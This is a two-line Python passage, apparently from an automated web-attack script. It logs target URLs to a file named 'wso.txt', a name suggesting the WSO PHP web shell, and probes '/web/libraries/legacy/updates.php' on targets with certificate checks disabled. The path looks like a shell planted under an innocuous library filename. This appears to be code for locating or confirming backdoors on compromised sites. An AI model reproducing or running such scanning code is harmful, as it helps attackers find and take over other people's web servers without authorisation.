            open('results/wso.txt', 'a').write(url_http + '/libraries/legacy/updates.php\n')

        check = requests.get(url_http + '/web/libraries/legacy/updates.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
